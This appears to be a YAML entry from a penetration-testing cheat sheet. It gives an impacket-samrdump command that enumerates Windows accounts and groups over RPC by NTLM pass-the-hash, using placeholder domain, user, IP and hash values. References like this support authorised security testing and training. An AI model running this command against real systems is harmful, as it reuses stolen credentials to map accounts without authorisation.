---
description: Enumerate user accounts and groups from the SAM database over RPC using Impacket's samrdump with NTLM Pass-the-Hash.

Command Reference:
    Target IP: 10.10.10.1
    Domain: test.local
    Username: john
    Hash: 580B16D486D8D2CAFA00B314D41FA396 (NTLM hash)

command: |
  impacket-samrdump -hashes 00000000000000000000000000000000:580B16D486D8D2CAFA00B314D41FA396 test.local/john@10.10.10.1

items:
  - Hash

services:
  - RPC
  - NTLM

OS:
  - Windows

attack_types:
  - Enumeration

references:
  - https://github.com/fortra/impacket
---
